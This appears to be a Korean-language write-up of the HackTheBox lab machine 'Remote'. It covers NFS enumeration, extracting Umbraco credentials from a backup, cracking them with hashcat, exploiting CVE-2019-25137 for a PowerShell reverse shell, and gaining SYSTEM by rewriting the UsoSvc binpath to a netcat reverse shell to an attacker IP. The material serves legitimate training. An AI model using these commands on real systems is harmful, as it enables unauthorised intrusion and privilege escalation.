# Remote - HackTheBox
## Recon
```bash
sudo nmap -p 111,135,139,2049,21,445,47001,49664,49665,49666,49667,49678,49679,49680,5985,80 -sC -sV -vv -oA remote 10.10.10.180
```
<img width="1104" height="178" alt="image" src="https://github.com/user-attachments/assets/cb815709-c698-4696-a8f4-78d4b069f28e" />
<img width="1104" height="570" alt="image" src="https://github.com/user-attachments/assets/3e161015-e7ad-4c6e-bb6d-bcb35c2ba665" />

- FTP(21)
- HTTP(80)
- NFS(111)
- SMB(445)
- WINRM(5985)

---
## HTTP
- `Umbraco` 발견.
<img width="1104" height="244" alt="image" src="https://github.com/user-attachments/assets/47dd6e81-1c00-4efe-bdba-a37b8a6e3f5b" />

<br>
<br>

- `/contatct`경로의 `GO TO BACK OFFICE AND INSTALL FORMS`버튼을 누르니 `/umbraco`경로의 로그인 페이지로 이동.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/f93f50f6-ea94-4e51-a14c-dbeccd460049" />

---
## NFS
- `NFS` 목록 확인.
```bash
showmount -e 10.10.10.180
```
<img width="1104" height="95" alt="image" src="https://github.com/user-attachments/assets/191661cf-63c4-4b3e-99c7-8ba61789cfca" />

<br>
<br>

- `/site_backups` 마운트.
```bash
sudo mount -t nfs 10.10.10.180:/site_backups ./site_backups -o nolock
```
<img width="1104" height="449" alt="image" src="https://github.com/user-attachments/assets/5a087d15-bf6a-418c-8b47-b24bc48d337b" />

<br>
<br>

- https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials
- 구글에서 `umbraco credential file location`을 검색.
<img width="727" height="62" alt="image" src="https://github.com/user-attachments/assets/e6b1c19e-23be-4278-9098-bb6904f950a4" />

<br>
<br>

- `strings`를 사용하여 읽을 수 있는 문자를 확인해서 계정 정보 발견.
<img width="1104" height="310" alt="image" src="https://github.com/user-attachments/assets/48a0be13-2755-4103-9fba-877f12dddfce" />

<br>
<br>

- `admin`의 해시 크래킹.
```bash
hashcat -m 100 hash ~/util/rockyou.txt
```
<img width="1104" height="78" alt="image" src="https://github.com/user-attachments/assets/7b5bd518-ccae-4a2f-8ef8-f0408c85ddca" />

<br>
<br>

- `admin@htb.local:baconandcheese` 로그인.
- `Umbraco 7.12.4`
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/bbafd01c-cf84-4f81-9a9b-098a785ad1fa" />

---
## CVE-2019-25137
- https://nvd.nist.gov/vuln/detail/CVE-2019-25137
<img width="1232" height="452" alt="image" src="https://github.com/user-attachments/assets/6781d5f8-6b20-4ea0-96ce-564885639dd5" />

<br>
<br>

- `proc.StartInfo.FileName`에 프로그램을 지정하고 `cmd`에 인자를 설정하여 명령어를 실행.
```bash
searchsploit -m 46153
```
<img width="1104" height="223" alt="image" src="https://github.com/user-attachments/assets/8fed5f0e-2240-4c7e-ab2b-5617c40c1643" />

<br>
<br>

- `FileName`을 `powershell`로 변경하고,  `cmd`를 리버스 셸 페이로드로 수정.
<img width="1104" height="313" alt="image" src="https://github.com/user-attachments/assets/79384ed8-2cc2-4761-80ae-f8ab3e062a1c" />

<br>
<br>

- 스크립트 실행하여 셸 획득.
<img width="1104" height="178" alt="image" src="https://github.com/user-attachments/assets/2a8e278f-d6b9-4920-b208-5e38fdfd33f5" />

---
## Privesc
- 특별한 정보를 찾을 수 없어 `winpeas`를 실행.
- `UsoSvc`서비스에 대해서 모든 권한 존재.
<img width="1104" height="134" alt="image" src="https://github.com/user-attachments/assets/709c9116-e96c-4526-bede-1cb318f61195" />

<br>
<br>

- 최고 권한인 `LocalSystem`으로 실행 중.
```powershell
sc.exe qc usosvc
```
<img width="1104" height="251" alt="image" src="https://github.com/user-attachments/assets/254046ce-a24c-4b2a-8dda-ddb65a1c9680" />

<br>
<br>

- 서비스 바이너리를 리버스 셸 을 실행시키는 코드로 변경하여 재시작.
```powershell
sc.exe stop usosvc

sc.exe config usosvc binpath="c:\temp\nc.exe 10.10.16.3 80 -e cmd.exe"

sc.exe qc usosvc

sc.exe start usosvc
```
<img width="1104" height="499" alt="image" src="https://github.com/user-attachments/assets/fd946168-795f-4583-88ee-60e064ad6e50" />

<br>
<br>

- `nt authority\system` 획득.
<img width="1104" height="210" alt="image" src="https://github.com/user-attachments/assets/5059b42e-0abe-4ef4-b538-1fb400ce3e97" />

---
## FLAG
- `c:\users\public\desktop\user.txt`
<img width="1104" height="263" alt="image" src="https://github.com/user-attachments/assets/4da5d8bb-0825-469c-b4a3-bf4fcd53fb53" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1104" height="247" alt="image" src="https://github.com/user-attachments/assets/1c458d73-f092-4f9e-9a61-56e5ad08e4e2" />
